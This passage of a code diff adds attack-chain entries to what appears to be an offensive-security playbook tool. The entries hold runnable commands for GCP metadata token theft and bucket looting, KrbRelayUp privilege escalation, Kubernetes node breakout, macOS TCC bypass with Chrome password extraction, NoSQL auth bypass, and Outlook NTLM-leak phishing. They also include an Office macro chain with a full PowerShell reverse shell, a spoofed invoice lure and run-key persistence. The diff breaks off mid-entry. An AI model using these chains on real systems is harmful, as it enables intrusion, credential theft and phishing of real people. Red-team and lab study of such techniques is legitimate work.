+          "inline_command": "curl '<url>http://metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'\ncurl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' -H 'Metadata-Flavor: Google'\ncurl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes' -H 'Metadata-Flavor: Google'\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "capture": [
+            {
+              "var": "gcp_project",
+              "regex": "^([a-z][a-z0-9-]+)$",
+              "match": "first"
+            },
+            {
+              "var": "gcp_sa_email",
+              "regex": "([^/\\s]+@[^/\\s]+\\.iam\\.gserviceaccount\\.com)",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "steal_token",
+          "name": "Steal the OAuth2 access token",
+          "inline_command": "curl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \\\n  -H 'Metadata-Flavor: Google'\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "capture": [
+            {
+              "var": "gcp_access_token",
+              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "enumerate_gcloud",
+          "name": "Use the token with gcloud / curl",
+          "inline_command": "export CLOUDSDK_AUTH_ACCESS_TOKEN='<token>'\ngcloud auth print-access-token\ngcloud projects list\ngcloud iam service-accounts list --project=<project>\n# Or raw API calls:\ncurl 'https://compute.googleapis.com/compute/v1/projects/<project>/zones?fields=items.name' \\\n  -H 'Authorization: Bearer <token>'\n",
+          "inputs": {
+            "token": "${gcp_access_token}",
+            "project": "${gcp_project}"
+          }
+        },
+        {
+          "id": "bucket_pillage",
+          "name": "Pillage GCS buckets (if scope allows)",
+          "inline_command": "# List all buckets in the project:\ncurl 'https://storage.googleapis.com/storage/v1/b?project=<project>' \\\n  -H 'Authorization: Bearer <token>'\n# Read each bucket's contents:\ncurl 'https://storage.googleapis.com/storage/v1/b/<bucket>/o' \\\n  -H 'Authorization: Bearer <token>'\n# Download an object:\ncurl 'https://storage.googleapis.com/storage/v1/b/<bucket>/o/<object>?alt=media' \\\n  -H 'Authorization: Bearer <token>' -o file\n",
+          "inputs": {
+            "token": "${gcp_access_token}",
+            "project": "${gcp_project}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "GCP metadata server docs",
+          "url": "https://cloud.google.com/compute/docs/metadata/overview"
+        },
+        {
+          "title": "HackTricks — GCP SSRF",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "kubernetes-pod-escape",
+          "when": "cluster GKE-hosted",
+          "reason": "Many GCP boxes are GKE pods — same SSRF often reaches Kubernetes API."
         }
       ]
     },
@@ -1659,6 +3567,153 @@ const CHAIN_DATA = {
           "chain": "ad-persistence-golden-ticket",
           "when": "target was DC",
           "reason": "Domain compromise → Golden Ticket."
+        }
+      ]
+    },
+    {
+      "id": "krbrelayup-cve-2022-26923",
+      "name": "Windows local — KrbRelayUp (local→SYSTEM via RBCD)",
+      "description": "Local Windows user → NT AUTHORITY\\SYSTEM via Kerberos relay against the host's own LDAP service, leveraging MachineAccountQuota=10 to create a computer account and write RBCD on the local machine, then S4U2self to SYSTEM. Works on default-config domain-joined Windows.\n",
+      "tags": [
+        "windows",
+        "priv-esc",
+        "krbrelayup",
+        "rbcd",
+        "kerberos",
+        "classic-windows"
+      ],
+      "difficulty": "medium",
+      "inputs": [],
+      "steps": [
+        {
+          "id": "confirm_domain_joined",
+          "name": "Confirm host is domain-joined + MAQ > 0",
+          "inline_command": "whoami /upn         # Should be user@domain\nnet config workstation | findstr /i domain\n# MAQ:\n$domain = (Get-WmiObject Win32_ComputerSystem).Domain\nGet-ADObject -Filter \"*\" -Properties ms-DS-MachineAccountQuota -Server $domain | Select-Object -First 1 | fl\n",
+          "notes": "Any value > 0 works. Default = 10 on every install since Win2000.\n"
+        },
+        {
+          "id": "build_or_grab",
+          "name": "Get the KrbRelayUp binary",
+          "inline_command": "# PowerShell on the victim:\niwr https://github.com/Dec0ne/KrbRelayUp/releases/latest/download/KrbRelayUp.exe -OutFile C:\\Windows\\Temp\\kru.exe\n"
+        },
+        {
+          "id": "full_chain_attack",
+          "name": "Run the full chain (creates computer + writes RBCD + S4U2self)",
+          "inline_command": "C:\\Windows\\Temp\\kru.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName ATTACKER$ -ComputerPassword 'P@ssw0rd!'\nC:\\Windows\\Temp\\kru.exe spawn -m rbcd -d <domain> -dc <dc-fqdn> -cn ATTACKER$ -cp 'P@ssw0rd!'\n",
+          "notes": "KrbRelayUp handles the whole dance:\n  1. Create ATTACKER$ via LDAP (MAQ allows it)\n  2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the local\n     machine, granting ATTACKER$ delegation rights\n  3. S4U2self as Administrator to the local CIFS service\n  4. Spawn cmd.exe as SYSTEM\nIf you see \"RPC Authentication Error\" — the host disabled LDAP\nsigning+channel binding (good — exploitable). If patched (KB5005413\nMay 2022), use the `shadowcred` mode instead.\n"
+        },
+        {
+          "id": "shadow_cred_variant",
+          "name": "Alternative: shadow-credential variant (patched-host friendly)",
+          "inline_command": "C:\\Windows\\Temp\\kru.exe spawn -m shadowcred -d <domain> -dc <dc-fqdn>"
+        },
+        {
+          "id": "confirm_system",
+          "name": "Confirm SYSTEM",
+          "inline_command": "whoami"
+        }
+      ],
+      "references": [
+        {
+          "title": "KrbRelayUp",
+          "url": "https://github.com/Dec0ne/KrbRelayUp"
+        },
+        {
+          "title": "Mor Davidovich's research",
+          "url": "https://www.crowdstrike.com/blog/krbrelayup-vulnerability-analysis/"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "reason": "SYSTEM → loot DPAPI for every user that logged in."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "NTLM hashes captured locally",
+          "reason": "Spread the harvested identities."
+        }
+      ]
+    },
+    {
+      "id": "kubernetes-pod-escape",
+      "name": "Cloud — Kubernetes pod token → API → node breakout",
+      "description": "RCE inside a pod gives you the pod's service-account token at /var/run/secrets/kubernetes.io/serviceaccount/token. Hit the API server, list permissions, escalate to a privileged namespace or break out to the host node.\n",
+      "tags": [
+        "cloud",
+        "kubernetes",
+        "container-escape",
+        "post-exploitation"
+      ],
+      "difficulty": "hard",
+      "inputs": [],
+      "steps": [
+        {
+          "id": "harvest_token",
+          "name": "Extract the pod's service-account token",
+          "inline_command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token\ncat /var/run/secrets/kubernetes.io/serviceaccount/namespace\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nenv | grep KUBERNETES\n",
+          "capture": [
+            {
+              "var": "sa_token",
+              "regex": "^(eyJ[A-Za-z0-9._-]+)$",
+              "match": "first"
+            },
+            {
+              "var": "namespace",
+              "regex": "^([a-z][a-z0-9-]+)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "api_url",
+          "name": "Find the API server",
+          "inline_command": "echo \"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\"",
+          "notes": "Usually 10.96.0.1:443 inside the pod network. Reachable from any\npod by default unless NetworkPolicy says otherwise.\n"
+        },
+        {
+          "id": "list_permissions",
+          "name": "What can this token do? (SelfSubjectAccessReview)",
+          "inline_command": "curl -sk \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"<ns>\",\"verb\":\"create\",\"resource\":\"pods\"}}}' \\\n  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews\n",
+          "notes": "Or use the kubectl auth plugin if you can drop a static binary:\n  kubectl auth can-i --list -n <ns>\nLook specifically for: create pods, get/list secrets, create\nrolebindings, escalate, impersonate.\n"
+        },
+        {
+          "id": "pillage_secrets",
+          "name": "If you can read secrets — pillage them",
+          "inline_command": "curl -sk -H \"Authorization: Bearer $TOKEN\" \\\n  https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets\n"
+        },
+        {
+          "id": "privileged_pod_breakout",
+          "name": "Create a privileged pod that mounts host filesystem → root on node",
+          "inline_command": "cat > /tmp/privpod.yaml <<'EOF'\napiVersion: v1\nkind: Pod\nmetadata: { name: pwned, namespace: <ns> }\nspec:\n  hostPID: true\n  containers:\n  - name: pwn\n    image: alpine\n    command: [\"/bin/sh\",\"-c\",\"nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh\"]\n    securityContext: { privileged: true }\n    volumeMounts: [{ name: host, mountPath: /host }]\n  volumes: [{ name: host, hostPath: { path: / } }]\nEOF\nkubectl --token=$TOKEN apply -f /tmp/privpod.yaml -n <ns>\nkubectl --token=$TOKEN exec -it pwned -n <ns> -- sh\n",
+          "notes": "You're now root on the underlying node. If it's a control-plane\nnode → cluster takeover. If it's just a worker → use the kubelet\nkubeconfig at /etc/kubernetes/kubelet.conf to talk to the API as\nthat node (often has wider access).\n"
+        },
+        {
+          "id": "rbac_escalate",
+          "name": "If you have `escalate` permission — create a cluster-admin binding",
+          "inline_command": "cat > /tmp/binding.yaml <<'EOF'\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata: { name: pwned-admin }\nroleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }\nsubjects: [{ kind: ServiceAccount, name: default, namespace: <ns> }]\nEOF\nkubectl --token=$TOKEN apply -f /tmp/binding.yaml\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "Kubernetes security cheatsheet",
+          "url": "https://book.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html"
+        },
+        {
+          "title": "Bishop Fox — Kubernetes attack matrix",
+          "url": "https://www.bishopfox.com/blog/kubernetes-pod-escape-using-log-mounts"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "broke out to a node shell",
+          "reason": "Stabilize before pivoting further."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "on the node now",
+          "reason": "Standard Linux PE recon on the worker / control-plane node."
         }
       ]
     },
@@ -2119,6 +4174,172 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "macos-tcc-bypass",
+      "name": "macOS — TCC bypass + SUID helper abuse",
+      "description": "macOS TCC (Transparency, Consent, and Control) gates access to camera, mic, Documents, etc. Common bypasses target the per-user TCC.db (writable in some configs), inherit consent via cross-process trickery, or piggy-back on already-consented apps (Terminal, iTerm).\n",
+      "tags": [
+        "macos",
+        "priv-esc",
+        "tcc",
+        "classic-macos"
+      ],
+      "difficulty": "medium",
+      "inputs": [],
+      "steps": [
+        {
+          "id": "macos_recon",
+          "name": "macOS recon",
+          "inline_command": "sw_vers\nwhoami; groups; id\ncsrutil status  # SIP on/off — SIP-off makes most attacks trivial\nls -la /Applications | grep -v '^d'  # SUID-flagged custom apps\n"
+        },
+        {
+          "id": "list_tcc_grants",
+          "name": "Inspect TCC.db (user-level — sometimes user-writable)",
+          "inline_command": "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \\\n  \"SELECT service, client, allowed FROM access;\"\n"
+        },
+        {
+          "id": "piggyback_terminal",
+          "name": "Piggyback already-consented Terminal (most common path)",
+          "inline_command": "# If Terminal has Full Disk Access (most devs grant it), any process\n# the user starts from Terminal inherits the consent.\n# Drop a payload that the user will run from Terminal:\ncat > /tmp/innocent.sh <<'EOF'\n#!/bin/bash\ncp -R ~/Library/Mail /tmp/.harvest/Mail 2>/dev/null\ncp -R ~/Library/Messages /tmp/.harvest/Messages 2>/dev/null\n# etc.\nEOF\nchmod +x /tmp/innocent.sh\n"
+        },
+        {
+          "id": "chrome_keychain",
+          "name": "Read browser Keychain (no TCC if you have the user's login pwd)",
+          "inline_command": "security find-generic-password -ga 'Chrome Safe Storage' -w\n# Use the returned key to decrypt Chrome's Login Data sqlite:\npython3 -c '\nimport sqlite3, sys, os\nconn = sqlite3.connect(os.path.expanduser(\"~/Library/Application Support/Google/Chrome/Default/Login Data\"))\nfor row in conn.execute(\"SELECT origin_url, username_value, password_value FROM logins\"):\n    print(row[0], row[1], row[2])'\n"
+        },
+        {
+          "id": "dscl_groups",
+          "name": "macOS-specific privesc — admin group + sudo",
+          "inline_command": "dscl . -read /Groups/admin GroupMembership\nsudo -l 2>/dev/null\n# If your user is in `admin`, `sudo -s` after entering password = root.\n# If sudoers has NOPASSWD on /usr/sbin/installer → install signed pkg\n# → root code execution.\n"
+        },
+        {
+          "id": "kext_or_root_helper",
+          "name": "Custom SUID helpers (look in /Applications, /Library)",
+          "inline_command": "find /Applications /Library -perm -4000 -type f 2>/dev/null\n# Many legacy apps ship SUID-root helpers in /Applications/*.app/Contents/.\n# Audit them as you would a Linux SUID — strings, ltrace alternative is\n# `dtruss -f -t open <binary>` or DTrace probes.\n"
+        },
+        {
+          "id": "full_disk_access_bypass",
+          "name": "Bypass Full Disk Access (TCCPlus / external drive trick)",
+          "inline_command": "# 1) Mount an external drive: cp ~/Library to /Volumes/USB/Library\n# 2) macOS doesn't apply TCC to external volumes by default.\n# 3) Read the copied DB freely.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "Csaba Fitzl — TCC bypasses",
+          "url": "https://theevilbit.github.io/posts/macos_tcc_dance_with_the_devil/"
+        },
+        {
+          "title": "Objective-See — macOS attacker tooling",
+          "url": "https://objective-see.org/blog.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "shell needs cleanup",
+          "reason": "macOS reverse shells need the same TTY upgrade."
+        }
+      ]
+    },
+    {
+      "id": "monikerlink-cve-2024-21413",
+      "name": "Phishing — MonikerLink (CVE-2024-21413) Outlook NTLM/RCE",
+      "description": "Outlook's protocol handler accepts file:// URLs prefixed with `!` (`file:///\\\\attacker\\share\\evil.rtf!something`) — Outlook fetches the remote file via SMB AND opens it in Word, bypassing Protected View. Free NTLM leak + bonus Word-render RCE if you have a working exploit.\n",
+      "tags": [
+        "phishing",
+        "outlook",
+        "monikerlink",
+        "cve-2024-21413",
+        "ntlm-leak",
+        "initial-access"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_email",
+          "required": true
+        },
+        {
+          "name": "listener_ip",
+          "description": "Your attacker IP — SMB share + Responder.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "prepare_smb_share",
+          "name": "Stage a malicious RTF on your SMB share",
+          "inline_command": "cat > /tmp/share/evil.rtf <<'EOF'\n{\\rtf1\\ansi\n[...RTF content... can include an OLE Word vulnerability payload here...]\n}\nEOF\nimpacket-smbserver share /tmp/share -smb2support -username '' -password ''\n",
+          "notes": "Even an empty RTF still triggers the NTLM leak — the auth happens\nBEFORE the content is rendered.\n"
+        },
+        {
+          "id": "start_responder",
+          "name": "Start Responder for SMB auth capture",
+          "inline_command": "sudo responder -I tun0 -A",
+          "notes": "`-A` enables auth-only mode (faster). The leak lands as NTLMv2 in\nSMB-NTLMv2-SSP-*.txt.\n"
+        },
+        {
+          "id": "craft_email",
+          "name": "Craft the email with the moniker link",
+          "inline_command": "# Embed the link in body or attachment; the moniker syntax is:\n#   file:///\\\\<attacker_ip>\\share\\evil.rtf!something\n# As clickable HTML:\n#   <a href=\"file:///\\\\<attacker>\\share\\evil.rtf!any\">click</a>\nswaks --server '<smtp>' --to '<email>' \\\n  --from 'noreply@cdn-cache.com' \\\n  --header 'Content-Type: text/html' \\\n  --body '<html><body><a href=\"file:///\\\\<listener>\\share\\evil.rtf!x\">View quarterly report</a></body></html>'\n",
+          "inputs": {
+            "smtp": "<smtp_server>",
+            "email": "${target_email}",
+            "listener": "${listener_ip}"
+          }
+        },
+        {
+          "id": "wait_for_click",
+          "name": "Wait for the click → NTLM in Responder",
+          "inline_command": "tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt",
+          "capture": [
+            {
+              "var": "ntlmv2_hash",
+              "regex": "^([^:]+::[^:]+:[a-f0-9]{16}:[a-f0-9]{32}:[A-Za-z0-9+/=]+)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "crack_or_relay",
+          "name": "Crack the NTLMv2 OR relay to LDAPS",
+          "branch": [
+            {
+              "when": "ntlmv2_hash",
+              "label": "Crack offline (have time, want plaintext)",
+              "command_ref": "hashcat-ntlmv2"
+            },
+            {
+              "when": "ntlmv2_hash",
+              "label": "Relay to LDAPS (no signing → Shadow Cred takeover)",
+              "command_ref": "ntlmrelayx-ldaps"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "MonikerLink — Check Point write-up",
+          "url": "https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/"
+        },
+        {
+          "title": "Microsoft advisory CVE-2024-21413",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ldap-relay-shadow-cred",
+          "when": "NTLMv2 captured AND LDAPS reachable",
+          "reason": "Relay → KeyCredentialLink takeover."
+        },
+        {
+          "chain": "password-spray",
+          "when": "plaintext cracked",
+          "reason": "Spray for Pwn3d! hosts."
+        }
+      ]
+    },
+    {
       "id": "mssql-impersonation-chain",
       "name": "Lateral — MSSQL login → impersonate → xp_cmdshell → shell",
       "description": "MSSQL is the most under-defended foothold on AD networks. With any login, enumerate impersonation rights and linked servers, walk the trust graph, enable xp_cmdshell and pop a SYSTEM/svc shell.\n",
@@ -2506,6 +4727,80 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "nosql-injection",
+      "name": "Web — NoSQL injection (MongoDB / similar)",
+      "description": "Login forms that pass query parameters directly into a MongoDB `find()` call without sanitization. `{$ne: ''}` style operator injection bypasses auth; `$regex` lets you boolean-blind dump every field character by character.\n",
+      "tags": [
+        "web",
+        "nosql",
+        "mongodb",
+        "auth-bypass",
+        "injection"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_url",
+          "description": "Vulnerable login endpoint.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "confirm",
+          "name": "Confirm NoSQL injection (auth bypass)",
+          "inline_command": "# Operator injection via JSON body:\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}'\n# Via form-encoded with [bracket] syntax:\ncurl -X POST '<url>' \\\n  -d 'username=admin&password[$ne]=x'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Either path sends `{password: {$ne: 'x'}}` to Mongo. If the app\nlogs you in (or returns a session cookie) → vulnerable.\n"
+        },
+        {
+          "id": "enumerate_users",
+          "name": "Enumerate valid usernames via $regex",
+          "inline_command": "# Returns 200/redirect when username starts with the regex match:\ncurl -X POST '<url>' \\\n  -d 'username[$regex]=^a&password[$ne]=x' -o /dev/null -w '%{http_code}\\n'\n# Loop a-z, then expand the prefix iteratively.\n"
+        },
+        {
+          "id": "extract_password",
+          "name": "Boolean-blind dump the admin's password",
+          "inline_command": "# Mongo query: {username: 'admin', password: {$regex: '^X.*'}}\n# Loop char by char:\nfor c in {a..z} {A..Z} {0..9} '!' '@' '#' '$'; do\n  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST '<url>' \\\n    -d \"username=admin&password[\\$regex]=^X$c.*\")\n  echo \"$c → $code\"\ndone\n# Whichever returns 200/success → next char is found. Append, repeat.\n",
+          "notes": "Slow but reliable. Tools like NoSQLMap or `nosqli` automate this.\n"
+        },
+        {
+          "id": "full_dump_with_nosqlmap",
+          "name": "Or skip the loop — use NoSQLMap",
+          "inline_command": "git clone https://github.com/codingo/NoSQLMap /tmp/nosqlmap\ncd /tmp/nosqlmap && python3 NoSQLMap.py\n# 2) Scan Sites → enter URL → choose blind regex injection.\n"
+        },
+        {
+          "id": "post_auth_pivot",
+          "name": "Once authenticated → look for next pivot",
+          "inline_command": "echo 'Authenticated session → revisit the app for admin panels, file upload, command injection, SSRF, deserialization endpoints.'"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — NoSQL Injection",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html"
+        },
+        {
+          "title": "PayloadsAllTheThings — NoSQL",
+          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "file-upload-bypass",
+          "when": "authenticated as admin",
+          "reason": "Most admin panels include uploads."
+        },
+        {
+          "chain": "ssti-to-rce",
+          "when": "admin panel templates user input",
+          "reason": "Templated admin output → SSTI."
+        }
+      ]
+    },
+    {
       "id": "ntlm-relay-adcs",
       "name": "Coerce → NTLM Relay → ADCS (ESC8) → DC Hash",
       "description": "Classic ESC8 chain. Start a relay listener pointed at the ADCS web enrollment endpoint, coerce the DC into authenticating to you, capture a certificate as the DC, then use that certificate to PKINIT-auth and recover the DC's NT hash.\n",
@@ -2627,6 +4922,206 @@ const CHAIN_DATA = {
           "chain": "pth-lateral-spread",
           "when": "dc_nt_hash captured",
           "reason": "Spread the DA hash."
+        }
+      ]
+    },
+    {
+      "id": "office-macro-initial-access",
+      "name": "Phishing — Office macro initial access → C2 shell",
+      "description": "Classic phishing chain. .docm with a VBA AutoOpen handler pulls down a PowerShell stager (or Cobalt Strike / Sliver / Mythic beacon) and runs in the user's context. Useful for red-team exercises and HTB \"Reel\" style boxes.\n",
+      "tags": [
+        "phishing",
+        "initial-access",
+        "office-macro",
+        "vba",
+        "classic-windows"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "lure_subject",
+          "description": "Email subject for the lure.",
+          "required": true
+        },
+        {
+          "name": "target_email",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "payload_choice",
+          "name": "Pick the payload (PowerShell vs Beacon)",
+          "inline_command": "echo 'PowerShell oneliner — fastest, no C2.\\nMythic / Sliver / CS beacon — full C2, persistence, lateral.\\nFor CTFs: powershell -nop -w hidden -enc <base64> is enough.'"
+        },
+        {
+          "id": "craft_macro",
+          "name": "Craft the VBA AutoOpen macro",
+          "inline_command": "cat > /tmp/macro.bas <<'EOF'\nSub AutoOpen()\n    Shell \"powershell.exe -nop -w hidden -enc <BASE64_OF_REVERSE_SHELL>\"\nEnd Sub\nSub Document_Open()\n    AutoOpen\nEnd Sub\nEOF\n# Encode the PS:\necho '$client = New-Object System.Net.Sockets.TCPClient(\"<lhost>\",<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0\n",
+          "inputs": {
+            "lhost": "${attacker_ip}",
+            "lport": "4444"
+          }
+        },
+        {
+          "id": "build_docm",
+          "name": "Build the .docm with the macro embedded",
+          "inline_command": "# Easiest: open LibreOffice → new document → Tools → Macros → paste,\n# save as .docm with the macro signature.\n# Or generate from CLI with macropack:\npip install macropack\nmacropack -m /tmp/macro.bas -t WORD -o /tmp/invoice_q3.docm\n"
+        },
+        {
+          "id": "send_lure",
+          "name": "Send the lure email",
+          "inline_command": "swaks --server '<smtp>' --to '<email>' \\\n  --from 'accounting@trusted-vendor.com' \\\n  --header 'Subject: <subject>' \\\n  --body 'Hi, please find the attached Q3 invoice.' \\\n  --attach /tmp/invoice_q3.docm \\\n  --attach-name 'Invoice-Q3.docm'\n",
+          "inputs": {
+            "smtp": "<smtp_server>",
+            "email": "${target_email}",
+            "subject": "${lure_subject}"
+          }
+        },
+        {
+          "id": "catch_shell",
+          "name": "Catch the reverse shell",
+          "inline_command": "rlwrap nc -lvnp <lport>",
+          "inputs": {
+            "lport": "4444"
+          }
+        },
+        {
+          "id": "persistence_immediate",
+          "name": "Quick persistence (run-key) before the user logs out",
+          "inline_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Updater\" /t REG_SZ /d \"powershell -nop -w hidden -enc <BASE64>\" /f\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1204.002 (User Execution: Malicious File)",
+          "url": "https://attack.mitre.org/techniques/T1204/002/"
+        },
+        {
+          "title": "HackTricks — Phishing methodology",
+          "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/index.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "PowerShell shell received",
+          "reason": "Stabilize before doing AD work."
+        },
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "shell on a workstation",
+          "reason": "User context has DPAPI of the logged-on user."
+        },
+        {
+          "chain": "ldap-anonymous-enum",
+          "when": "shell on a domain-joined host",
+          "reason": "Start AD enumeration with the user context."
+        }
+      ]
+    },
+    {
+      "id": "outlook-cve-2023-23397",
+      "name": "Phishing — Outlook NTLM leak (CVE-2023-23397)",
+      "description": "Outlook on Windows leaks an NTLM hash to any UNC path set in a calendar appointment's PidLidReminderFileParameter. Send the target a meeting invite, capture the NTLMv2 hash with Responder, crack offline → domain user creds.\n",
+      "tags": [
+        "phishing",
+        "outlook",
+        "ntlm-leak",
+        "cve-2023-23397",
+        "initial-access"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_email",
+          "description": "Victim's email address.",
+          "required": true
+        },
+        {
+          "name": "smtp_server",
+          "description": "SMTP server you control or relay through.",
+          "required": true
+        },
+        {
+          "name": "listener_ip",
+          "description": "Your attacker IP (Responder/ntlmrelayx must listen here).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "start_responder",
+          "name": "Start Responder to capture NTLMv2",
+          "inline_command": "sudo responder -I tun0 -wF",
+          "notes": "`-w` brings up the WPAD + SMB servers; `-F` enables NTLMv1 negotiation\ndowngrade attempts. Watch the SMB section — that's where the leak\nwill land.\n"
+        },
+        {
+          "id": "craft_calendar_invite",
+          "name": "Craft the malicious .msg / .eml with UNC reminder",
+          "inline_command": "python3 CVE-2023-23397.py \\\n  --sender attacker@evilcorp.com \\\n  --recipient '<target_email>' \\\n  --uncpath '\\\\<listener_ip>\\share\\sound.wav' \\\n  --output evil_invite.msg\n",
+          "inputs": {
+            "target_email": "${target_email}",
+            "listener_ip": "${listener_ip}"
+          },
+          "notes": "The trick is `PidLidReminderFileParameter` pointing to your SMB\nshare with `\\\\` (UNC). When the reminder fires, Outlook tries to\nplay the sound → SMB auth → NTLMv2 to your Responder. The user\ndoesn't have to click anything; the reminder fires automatically.\n"
+        },
+        {
+          "id": "send_invite",
+          "name": "Send the invite via SMTP",
+          "inline_command": "swaks --server '<smtp>' --to '<email>' --from 'attacker@evilcorp.com' \\\n  --header 'Subject: Quick sync tomorrow' --attach evil_invite.msg\n",
+          "inputs": {
+            "smtp": "${smtp_server}",
+            "email": "${target_email}"
+          }
+        },
+        {
+          "id": "capture_hash",
+          "name": "Capture NTLMv2 in Responder",
+          "inline_command": "tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt",
+          "capture": [
+            {
+              "var": "ntlmv2_hash",
+              "regex": "^([^:]+::[^:]+:[a-f0-9]{16}:[a-f0-9]{32}:[A-Za-z0-9+/=]+)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "crack",
+          "name": "Crack the NTLMv2 hash",
+          "command_ref": "hashcat-ntlmv2",
+          "requires": [
+            "ntlmv2_hash"
+          ]
+        },
+        {
+          "id": "relay_alternative",
+          "name": "Alternative: skip the crack — relay directly",
+          "inline_command": "impacket-ntlmrelayx -t ldaps://<dc> --shadow-credentials --shadow-target '<target_user>'",
+          "notes": "If LDAP signing isn't enforced, the leaked NTLMv2 can be relayed in\nreal time to LDAPS → write a KeyCredentialLink on the target →\nPKINIT chain. See ldap-relay-shadow-cred for full details.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2023-23397 (MDSec)",
+          "url": "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
+        },
+        {
+          "title": "Microsoft advisory",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "password-spray",
+          "when": "cracked plaintext",
+          "reason": "Cracked password → spray to find Pwn3d! hosts."
+        },
+        {
+          "chain": "ldap-relay-shadow-cred",
+          "when": "NTLMv2 captured AND LDAPS reachable",
+          "reason": "Relay it instead of cracking — instant Shadow Cred takeover."
         }
       ]
     },
@@ -2826,6 +5321,196 @@ const CHAIN_DATA = {
           "chain": "smb-null-session-enum",
           "when": "SMB open on an internal host",
           "reason": "Restart the AD attack tree against the internal network."
+        }
+      ]
+    },
+    {
+      "id": "printnightmare-cve-2021-1675",
+      "name": "Windows — PrintNightmare (CVE-2021-1675 / 34527) SYSTEM",
+      "description": "Print Spooler service loads attacker-supplied printer drivers as SYSTEM. Local privesc from any authenticated user; remote from low-priv domain user against any host running spooler. Patched mid-2021 but still ubiquitous on labs and unpatched servers.\n",
+      "tags": [
+        "windows",
+        "priv-esc",
+        "printnightmare",
+        "cve-2021-1675",
